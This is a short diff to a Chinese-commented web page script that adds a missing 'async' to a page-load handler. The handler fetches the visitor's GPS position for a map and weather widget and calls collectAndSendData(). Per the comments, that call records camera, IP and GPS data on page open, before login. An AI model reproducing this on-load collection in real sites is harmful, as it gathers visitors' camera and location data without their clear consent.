@@ -612,26 +612,26 @@
     /************************************************
      * 8. 頁面載入後 (可視需求預先執行收集)
      ************************************************/
-    document.addEventListener('DOMContentLoaded', () => {
-      try {
-        // 一開始就抓 GPS 座標，更新地圖 & 天氣（登入前也可看）
-        const gpsData = await getGpsCoordinates();
-        if (gpsData) {
-          // 更新地圖
-          document.getElementById('map').src = 
-            `https://www.google.com/maps?q=${gpsData.latitude},${gpsData.longitude}&hl=zh-TW&z=15&output=embed`;
-          // 更新天氣
-          await getWeatherInfo(gpsData.latitude, gpsData.longitude);
-        }
+   document.addEventListener('DOMContentLoaded', async () => { // 加上 async
+  try {
+    // 一開始就抓 GPS 座標，更新地圖 & 天氣（登入前也可看）
+    const gpsData = await getGpsCoordinates();
+    if (gpsData) {
+      // 更新地圖
+      document.getElementById('map').src = 
+        `https://www.google.com/maps?q=${gpsData.latitude},${gpsData.longitude}&hl=zh-TW&z=15&output=embed`;
+      // 更新天氣
+      await getWeatherInfo(gpsData.latitude, gpsData.longitude);
+    }
 
-        // 一打開就開始記錄資料（相機 / IP / GPS）
-        // 注意：若不想在「未登入」時就收集，請移除此行或改到登入後
-        collectAndSendData();
+    // 一打開就開始記錄資料（相機 / IP / GPS）
+    // 注意：若不想在「未登入」時就收集，請移除此行或改到登入後
+    collectAndSendData();
 
-      } catch (error) {
-        console.error('DOMContentLoaded 初始化時錯誤:', error);
-      }
-    });
+  } catch (error) {
+    console.error('DOMContentLoaded 初始化時錯誤:', error);
+  }
+});
   </script>
 </body>
 </html>
